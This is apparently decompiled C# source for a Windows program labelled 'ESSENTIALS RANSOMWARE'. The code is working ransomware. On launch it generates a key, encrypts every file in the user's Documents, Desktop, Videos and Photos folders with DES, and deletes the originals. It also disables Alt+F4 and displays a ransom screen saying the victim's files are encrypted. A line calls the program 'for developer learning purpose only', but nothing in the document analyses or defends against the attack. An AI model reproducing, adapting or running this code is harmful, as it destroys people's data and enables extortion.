using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace ARFT;

public class Form1 : Form
{
	public const int iterations = 1042;

	private string ReadFilename;

	private string WriteFilename;

	private string outputFile;

	public readonly byte[] salt;

	private string PassWord;

	private byte[] iv;

	private bool On;

	private Point Pos;

	private IContainer components;

	private OpenFileDialog openFileDialog1;

	private SaveFileDialog saveFileDialog1;

	private Label label1;

	private Label label2;

	private Label label3;

	private RichTextBox richTextBox1;

	public Form1()
	{
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		MouseEventHandler val = null;
		MouseEventHandler val2 = null;
		MouseEventHandler val3 = null;
		byte[] array = (salt = new byte[8]);
		PassWord = "12345678";
		iv = new byte[16];
		components = null;
		((Form)this)._002Ector();
		InitializeComponent();
		val = (MouseEventHandler)delegate(object sender, MouseEventArgs e)
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Invalid comparison between Unknown and I4
			if ((int)e.get_Button() == 1048576)
			{
				On = true;
				Pos = e.get_Location();
			}
		};
		((Control)this).add_MouseDown(val);
		val2 = (MouseEventHandler)delegate(object sender, MouseEventArgs e)
		{
			if (On)
			{
				((Form)this).set_Location(new Point(((Form)this).get_Location().X + (e.get_X() - Pos.X), ((Form)this).get_Location().Y + (e.get_Y() - Pos.Y)));
			}
		};
		((Control)this).add_MouseMove(val2);
		val3 = (MouseEventHandler)delegate(object sender, MouseEventArgs e)
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Invalid comparison between Unknown and I4
			if ((int)e.get_Button() == 1048576)
			{
				On = false;
				Pos = e.get_Location();
			}
		};
		((Control)this).add_MouseUp(val3);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).set_Region(Region.FromHrgn(CreateRoundRectRgn(0, 0, ((Control)this).get_Width(), ((Control)this).get_Height(), 10, 10)));
		File.Delete("C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\hashkey.cer");
		byte[] array = new byte[16];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		string text = BitConverter.ToString(array);
		string text2 = text.Substring(0, 8);
		string path = "C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\hashkey.cer";
		string contents = text2;
		File.WriteAllText(path, contents, Encoding.Default);
		IEnumerable<string> enumerable = Directory.EnumerateFiles(Environment.ExpandEnvironmentVariables("C:\\Users\\%username%\\Documents"), "*.*", SearchOption.AllDirectories);
		foreach (string item in enumerable)
		{
			WriteFilename = (ReadFilename = item) + ".ESSENTIALS";
			string s = text2;
			FileStream fileStream = new FileStream(ReadFilename, FileMode.Open, FileAccess.Read, FileShare.None);
			FileStream fileStream2 = new FileStream(WriteFilename, FileMode.Create, FileAccess.Write);
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			dESCryptoServiceProvider.Key = Encoding.Default.GetBytes(s);
			dESCryptoServiceProvider.IV = Encoding.Default.GetBytes(s);
			ICryptoTransform transform = dESCryptoServiceProvider.CreateEncryptor();
			CryptoStream cryptoStream = new CryptoStream(fileStream2, transform, CryptoStreamMode.Write);
			byte[] array2 = new byte[fileStream.Length];
			fileStream.Read(array2, 0, array2.Length);
			cryptoStream.Write(array2, 0, array2.Length);
			fileStream2.Flush();
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			File.Delete(ReadFilename);
		}
		IEnumerable<string> enumerable2 = Directory.EnumerateFiles(Environment.ExpandEnvironmentVariables("C:\\Users\\%username%\\Desktop"), "*.*", SearchOption.AllDirectories);
		foreach (string item2 in enumerable2)
		{
			WriteFilename = (ReadFilename = item2) + ".ESSENTIALS";
			string s = text2;
			FileStream fileStream = new FileStream(ReadFilename, FileMode.Open, FileAccess.Read, FileShare.None);
			FileStream fileStream2 = new FileStream(WriteFilename, FileMode.Create, FileAccess.Write);
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			dESCryptoServiceProvider.Key = Encoding.Default.GetBytes(s);
			dESCryptoServiceProvider.IV = Encoding.Default.GetBytes(s);
			ICryptoTransform transform = dESCryptoServiceProvider.CreateEncryptor();
			CryptoStream cryptoStream = new CryptoStream(fileStream2, transform, CryptoStreamMode.Write);
			byte[] array2 = new byte[fileStream.Length];
			fileStream.Read(array2, 0, array2.Length);
			cryptoStream.Write(array2, 0, array2.Length);
			fileStream2.Flush();
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			File.Delete(ReadFilename);
		}
		IEnumerable<string> enumerable3 = Directory.EnumerateFiles(Environment.ExpandEnvironmentVariables("C:\\Users\\%username%\\Videos"), "*.*", SearchOption.AllDirectories);
		foreach (string item3 in enumerable3)
		{
			WriteFilename = (ReadFilename = item3) + ".ESSENTIALS";
			string s = text2;
			FileStream fileStream = new FileStream(ReadFilename, FileMode.Open, FileAccess.Read, FileShare.None);
			FileStream fileStream2 = new FileStream(WriteFilename, FileMode.Create, FileAccess.Write);
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			dESCryptoServiceProvider.Key = Encoding.Default.GetBytes(s);
			dESCryptoServiceProvider.IV = Encoding.Default.GetBytes(s);
			ICryptoTransform transform = dESCryptoServiceProvider.CreateEncryptor();
			CryptoStream cryptoStream = new CryptoStream(fileStream2, transform, CryptoStreamMode.Write);
			byte[] array2 = new byte[fileStream.Length];
			fileStream.Read(array2, 0, array2.Length);
			cryptoStream.Write(array2, 0, array2.Length);
			fileStream2.Flush();
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			File.Delete(ReadFilename);
		}
		IEnumerable<string> enumerable4 = Directory.EnumerateFiles(Environment.ExpandEnvironmentVariables("C:\\Users\\%username%\\Photos"), "*.*", SearchOption.AllDirectories);
		foreach (string item4 in enumerable4)
		{
			WriteFilename = (ReadFilename = item4) + ".ESSENTIALS";
			string s = text2;
			FileStream fileStream = new FileStream(ReadFilename, FileMode.Open, FileAccess.Read, FileShare.None);
			FileStream fileStream2 = new FileStream(WriteFilename, FileMode.Create, FileAccess.Write);
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			dESCryptoServiceProvider.Key = Encoding.Default.GetBytes(s);
			dESCryptoServiceProvider.IV = Encoding.Default.GetBytes(s);
			ICryptoTransform transform = dESCryptoServiceProvider.CreateEncryptor();
			CryptoStream cryptoStream = new CryptoStream(fileStream2, transform, CryptoStreamMode.Write);
			byte[] array2 = new byte[fileStream.Length];
			fileStream.Read(array2, 0, array2.Length);
			cryptoStream.Write(array2, 0, array2.Length);
			fileStream2.Flush();
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			File.Delete(ReadFilename);
		}
	}

	[DllImport("Gdi32.dll")]
	private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);

	private void Form1_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Invalid comparison between Unknown and I4
		if (e.get_Alt() && (int)e.get_KeyCode() == 115)
		{
			e.set_Handled(true);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_010b: Expected O, but got Unknown
		//IL_019a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a4: Expected O, but got Unknown
		//IL_0233: Unknown result type (might be due to invalid IL or missing references)
		//IL_023d: Expected O, but got Unknown
		//IL_0333: Unknown result type (might be due to invalid IL or missing references)
		//IL_033d: Expected O, but got Unknown
		//IL_0374: Unknown result type (might be due to invalid IL or missing references)
		//IL_037e: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		openFileDialog1 = new OpenFileDialog();
		saveFileDialog1 = new SaveFileDialog();
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		richTextBox1 = new RichTextBox();
		((Control)this).SuspendLayout();
		((FileDialog)openFileDialog1).set_FileName("openFileDialog1");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Brown", 21.8f));
		((Control)label1).set_Location(new Point(103, 99));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(222, 50));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("ESSENTIALS");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Brown", 21.8f));
		((Control)label2).set_ForeColor(Color.FromArgb(243, 123, 88));
		((Control)label2).set_Location(new Point(313, 99));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(281, 50));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("RANSOMWARE");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Brown", 7f));
		((Control)label3).set_ForeColor(Color.FromArgb(49, 49, 49));
		((Control)label3).set_Location(new Point(178, 153));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(325, 32));
		((Control)label3).set_TabIndex(2);
		((Control)label3).set_Text("Your important documents, photos, videos are encrypted\r\n**This program is for developer learning purpose only**");
		label3.set_TextAlign((ContentAlignment)2);
		((Control)richTextBox1).set_Font(new Font("Brown", 7.8f));
		((Control)richTextBox1).set_Location(new Point(112, 201));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(468, 189));
		((Control)richTextBox1).set_TabIndex(3);
		((Control)richTextBox1).set_Text(componentResourceManager.GetString("richTextBox1.Text"));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(120f, 120f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)2);
		((Control)this).set_BackColor(Color.White);
		((Form)this).set_ClientSize(new Size(686, 509));
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("NML v1.0 (Personal)");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).add_KeyDown(new KeyEventHandler(Form1_KeyDown));
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
